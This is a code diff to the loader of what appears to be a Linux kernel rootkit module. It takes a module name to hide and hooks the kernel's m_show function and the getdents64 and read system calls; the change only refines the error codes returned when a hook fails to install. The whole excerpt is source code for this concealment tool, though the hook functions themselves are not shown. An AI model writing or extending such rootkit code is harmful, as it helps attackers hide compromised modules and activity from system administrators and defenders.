@@ -170,22 +170,22 @@ int load(void) {
     pr_info("Initializing...");
     if (mod_name_to_hide == NULL) {
         pr_warn("Mod name to hide has not been set! Exiting...");
-        return -1;
+        return -EINVAL;
     }
 
     int m_show_res = setup_kernel_func_hook(&m_show_hook, "m_show", (unsigned long)new_m_show);
     if (m_show_res) {
-        return -1;
+        return m_show_res;
     }
 
     int getdents_res = setup_syscall_hook(&getdents64_hook,__NR_getdents64, (unsigned long)new_getdents64);
     if (getdents_res) {
-        return -1;
+        return getdents_res;
     }
 
     int read_res = setup_syscall_hook(&read_hook, __NR_read, (unsigned long)new_read);
     if (read_res) {
-        return -1;
+        return read_res;
     }
 
     pr_info("Initialized successfuly!");
